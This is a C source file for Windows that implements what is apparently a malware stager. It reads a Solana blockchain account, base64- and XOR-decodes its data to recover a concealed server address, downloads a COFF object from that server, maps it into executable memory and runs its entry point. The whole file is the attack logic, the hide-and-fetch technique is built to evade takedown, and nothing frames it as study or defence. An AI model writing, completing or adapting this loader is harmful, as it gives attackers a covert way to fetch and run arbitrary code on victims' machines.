#include <windows.h>
#include <winhttp.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

typedef void (*module_entry_t)(void);

extern char *http_post_json(const char *url, const char *body);
extern uint8_t *http_get_bytes(const char *url, size_t *length);
extern uint8_t *json_first_data_value(char *response, size_t *length);
extern uint8_t *base64_decode(const uint8_t *encoded, size_t encoded_len,
                              size_t *cleartext_len);
extern void apply_coff_relocations(uint8_t *image, IMAGE_FILE_HEADER *header);
extern void *resolve_coff_symbol(uint8_t *image, IMAGE_SYMBOL *symbols,
                                 DWORD symbol_count, const char *name);

static char *lookup_endpoint(void) {
    static const uint8_t xor_key[] = {0x31, 0x7a, 0xc4, 0x09, 0x52};
    static const char rpc_url[] = "https://api.mainnet.solana.com";
    static const char request[] =
        "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"getAccountInfo\","
        "\"params\":[\"AnyOtherAccount\","
        "{\"encoding\":\"base64\"}]}";

    char *response = http_post_json(rpc_url, request);
    size_t encoded_len = 0;
    uint8_t *encoded = json_first_data_value(response, &encoded_len);
    size_t cleartext_len = 0;
    uint8_t *cleartext = base64_decode(encoded, encoded_len, &cleartext_len);

    for (size_t i = 0; i < cleartext_len; ++i) {
        cleartext[i] ^= xor_key[i % sizeof(xor_key)];
    }
    cleartext[cleartext_len] = '\0';
    return (char *)cleartext;
}

static void load_native_object(uint8_t *object, size_t object_len) {
    IMAGE_FILE_HEADER *header = (IMAGE_FILE_HEADER *)object;
    if (object_len < sizeof(*header) ||
        header->Machine != IMAGE_FILE_MACHINE_AMD64 ||
        header->NumberOfSections == 0 || header->PointerToSymbolTable == 0) {
        return;
    }

    IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER *)(header + 1);
    IMAGE_SYMBOL *symbols = (IMAGE_SYMBOL *)(object + header->PointerToSymbolTable);
    uint8_t *mapped = VirtualAlloc(NULL, object_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mapped) return;

    for (WORD i = 0; i < header->NumberOfSections; ++i) {
        memcpy(mapped + sections[i].VirtualAddress,
               object + sections[i].PointerToRawData,
               sections[i].SizeOfRawData);
    }
    apply_coff_relocations(mapped, header);
    module_entry_t entry = (module_entry_t)resolve_coff_symbol(
        mapped, symbols, header->NumberOfSymbols, "plugin_start");
    if (entry) entry();
}

int main(void) {
    char *authority = lookup_endpoint();
    char request_url[512];
    snprintf(request_url, sizeof(request_url), "https://%s/next", authority);

    size_t module_len = 0;
    uint8_t *module = http_get_bytes(request_url, &module_len);
    load_native_object(module, module_len);
    return 0;
}
